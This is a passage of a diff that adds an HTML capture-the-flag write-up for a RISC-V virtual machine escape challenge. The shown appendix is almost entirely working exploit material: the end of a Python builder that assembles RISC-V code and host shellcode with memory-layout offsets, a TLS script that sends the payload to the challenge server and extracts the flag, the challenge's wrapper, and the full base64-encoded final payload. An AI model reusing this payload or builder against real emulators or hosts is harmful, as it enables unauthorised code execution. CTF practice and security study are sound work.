+        a.jal(X0, &quot;trigger&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    return a.resolve()
+
+
+def main():
+    shellcode, labels = build_shellcode()
+    layout = {
+        &quot;slot_base&quot;: int(os.environ.get(&quot;VP_SLOT_BASE&quot;, &quot;0x2400&quot;), 0),
+        &quot;oldprotect&quot;: int(os.environ.get(&quot;VP_OLDPROTECT&quot;, &quot;0x2f00&quot;), 0),
+        &quot;shell&quot;: int(os.environ.get(&quot;VP_SHELL&quot;, &quot;0x3000&quot;), 0),
+        &quot;r9_pops&quot;: int(os.environ.get(&quot;VP_R9_POPS&quot;, &quot;3&quot;), 0),
+        &quot;spin_stage&quot;: os.environ.get(&quot;VP_SPIN_STAGE&quot;, &quot;&quot;),
+    }
+    spin = os.environ.get(&quot;SPIN_AFTER_WRITE&quot;) == &quot;1&quot;
+    payload = build(layout, labels, spin_after_write=spin)
+    shell_file_off = layout[&quot;shell&quot;] - 0x110
+    if len(payload) &gt; shell_file_off:
+        raise SystemExit(f&quot;shell offset overlaps RISC-V code: code={len(payload)} shell_file_off={shell_file_off}&quot;)
+    payload += b&quot;\x13\x00\x00\x00&quot; * ((shell_file_off - len(payload)) // 4)
+    payload += b&quot;\x00&quot; * ((shell_file_off - len(payload)) % 4)
+    payload += shellcode
+
+    out = Path(&quot;sol&quot;)
+    out.mkdir(exist_ok=True)
+    stem = os.environ.get(&quot;VP_OUT&quot;, &quot;real_vp_shell&quot;)
+    (out / f&quot;{stem}.bin&quot;).write_bytes(payload)
+    (out / f&quot;{stem}.b64&quot;).write_text(base64.b64encode(payload).decode(), newline=&quot;&quot;)
+    print(f&quot;shellcode={len(shellcode)} bytes&quot;)
+    print(f&quot;slot_base={layout[&#x27;slot_base&#x27;]:#x}&quot;)
+    print(f&quot;shell={layout[&#x27;shell&#x27;]:#x}&quot;)
+    print(f&quot;r9_pops={layout[&#x27;r9_pops&#x27;]}&quot;)
+    print(f&quot;wrote {out / (stem + &#x27;.bin&#x27;)} ({len(payload)} bytes)&quot;)
+    print(f&quot;wrote {out / (stem + &#x27;.b64&#x27;)} ({len(base64.b64encode(payload))} bytes base64)&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>solve_ssl.py / TLS submission helper</span><span class="meta">2,496 bytes / SHA256 BFE28E98111B8D00...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import re
+import socket
+import ssl
+import sys
+import time
+from pathlib import Path
+
+
+DEFAULT_HOST = &quot;dontriscyet-448f01f82d52.inst.omnictf.com&quot;
+DEFAULT_PORT = 1337
+ROOT = Path(__file__).resolve().parent
+
+
+def default_payload_for(host: str) -&gt; Path:
+    host_l = host.lower()
+    if &quot;dontriscyet&quot; in host_l:
+        return ROOT / &quot;sol&quot; / &quot;exploit_aslr_0x8000.bin&quot;
+    if &quot;ristbiscreal&quot; in host_l:
+        return ROOT / &quot;sol&quot; / &quot;real_wsystem.bin&quot;
+    raise SystemExit(
+        &quot;[-] Unknown challenge hostname. Pass the payload explicitly, e.g. &quot;
+        &quot;python solve_ssl.py HOST 1337 10 .\\sol\\exploit.bin&quot;
+    )
+
+
+def recv_until_idle(sock: ssl.SSLSocket, timeout: float) -&gt; bytes:
+    sock.settimeout(timeout)
+    chunks = []
+    while True:
+        try:
+            chunk = sock.recv(4096)
+        except socket.timeout:
+            break
+        if not chunk:
+            break
+        chunks.append(chunk)
+    return b&quot;&quot;.join(chunks)
+
+
+def attempt(host: str, port: int, payload: bytes) -&gt; str:
+    context = ssl.create_default_context()
+    with socket.create_connection((host, port), timeout=10) as raw_sock:
+        with context.wrap_socket(raw_sock, server_hostname=host) as sock:
+            banner = recv_until_idle(sock, 1.0)
+            sock.sendall(payload)
+            return (banner + recv_until_idle(sock, 15.0)).decode(&quot;utf-8&quot;, &quot;ignore&quot;)
+
+
+def main() -&gt; int:
+    host = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT_HOST
+    port = int(sys.argv[2]) if len(sys.argv) &gt; 2 else DEFAULT_PORT
+    tries = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 10
+    payload_path = Path(sys.argv[4]) if len(sys.argv) &gt; 4 else default_payload_for(host)
+    payload = base64.b64encode(payload_path.read_bytes()) + b&quot;\n&quot;
+    print(f&quot;payload={payload_path} bytes={payload_path.stat().st_size}&quot;)
+
+    for i in range(tries):
+        try:
+            text = attempt(host, port, payload)
+        except OSError as exc:
+            text = f&quot;[connect error] {exc}&quot;
+
+        print(f&quot;--- attempt {i + 1}/{tries} ---&quot;)
+        print(text.replace(&quot;\x00&quot;, &quot;&quot;))
+
+        match = re.search(r&quot;OmniCTF\{[^}\n]*\}&quot;, text)
+        if match:
+            print(f&quot;FLAG={match.group(0)}&quot;)
+            return 0
+
+        if &quot;HTTP/1.1 400 Bad Request&quot; in text or &quot;404 page not found&quot; in text:
+            print(&quot;[!] Reached HTTP frontend, not the raw challenge backend.&quot;)
+            return 2
+
+        time.sleep(1)
+
+    return 1
+
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>SocketHandler.py / local wrapper</span><span class="meta">1,203 bytes / SHA256 64A0F475D794FAE5...</span></summary>
+  <div class="codebox"><pre><code class="language-py">import subprocess
+from base64 import b64decode
+import pathlib
+
+
+script_dir = pathlib.Path(__file__).parent.resolve()
+bin_path = script_dir / &quot;RV64VMv4.exe&quot;
+pattern_path = script_dir / &quot;.flag_pattern&quot;
+exploit_path = script_dir / &quot;exploit.bin&quot;
+
+try:
+    with open(pattern_path, &quot;rb&quot;) as pattern_file:
+        MAGIC_PATTERN = pattern_file.read().strip()
+except FileNotFoundError:
+    print(&quot;[-] .flag_pattern file not found&quot;)
+    exit(1)
+
+enc_data = input(&quot;Enter payload encoded in Base64: &quot;)
+
+with open(exploit_path, &quot;wb&quot;) as f:
+    data = b64decode(enc_data)
+    print(&quot;[*] Decoding and writing to exploit.bin...&quot;)
+    print(f&quot;[*] Raw payload size: {len(data)}&quot;)
+    f.write(data)
+
+try:
+    result = subprocess.run(
+        [bin_path, exploit_path],
+        capture_output=True,
+        check=False
+    )
+    output = result.stdout + result.stderr
+except FileNotFoundError:
+    print(f&quot;[-] {bin_path.name} not found&quot;)
+    exit(1)
+
+flag_found = False
+for line in output.split(b&quot;\n&quot;):
+    if MAGIC_PATTERN in line:
+        print(line.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;).strip())
+        flag_found = True
+        break
+
+if not flag_found:
+    print(&quot;[-] No flag&quot;)
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>real_wsystem.b64 / final Base64 payload</span><span class="meta">3,836 chars / SHA256 E67710A926AB8CB1...</span></summary>
+  <div class="codebox"><pre><code class="language-text">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
+</code></pre></div>
+</details></section></main>
+    <aside aria-label="Table of contents">
+      <strong>Report Contents</strong>
+      <ul class="toc"><li><a href="#summary">Summary</a></li><li><a href="#challenge">Challenge</a></li><li><a href="#tools">Tools</a></li><li><a href="#analysis">Analysis</a></li><li><a href="#design">Exploit Design</a></li><li><a href="#implementation">Implementation</a></li><li><a href="#artifacts">Artifacts</a></li><li><a href="#local">Local Validation</a></li><li><a href="#remote">Remote Execution</a></li><li><a href="#appendix">Appendix</a></li></ul>
+    </aside>
+  </div>
+  <footer class="footer">Prepared as a formal CTF write-up report. All scripts referenced by the final solution are embedded in the appendices.</footer>
+  <script>
+const progress = document.getElementById("progressBar");
+const updateProgress = () => {
+  const top = document.documentElement.scrollTop || document.body.scrollTop;
+  const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+  progress.style.width = `${height ? (top / height) * 100 : 0}%`;
+};
+window.addEventListener("scroll", updateProgress, { passive: true });
+updateProgress();
+
+document.querySelectorAll("pre").forEach((pre) => {
+  const button = document.createElement("button");
+  button.type = "button";
+  button.className = "copy";
+  button.textContent = "Copy";
+  button.addEventListener("click", async () => {
+    try {
+      await navigator.clipboard.writeText(pre.innerText);
+      button.textContent = "Copied";
+    } catch {
+      button.textContent = "Select";
+    }
+    setTimeout(() => button.textContent = "Copy", 1200);
+  });
+  pre.parentElement.prepend(button);
+});
+
+const links = Array.from(document.querySelectorAll(".toc a"));
+const sections = links.map((link) => document.querySelector(link.getAttribute("href"))).filter(Boolean);
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach((entry) => {
+    if (!entry.isIntersecting) return;
+    links.forEach((link) => link.classList.remove("active"));
+    const current = links.find((link) => link.getAttribute("href") === `#${entry.target.id}`);
+    if (current) current.classList.add("active");
+  });
+}, { rootMargin: "-30% 0px -60% 0px", threshold: 0.01 });
+sections.forEach((section) => observer.observe(section));
+</script>
+</body>
+</html>
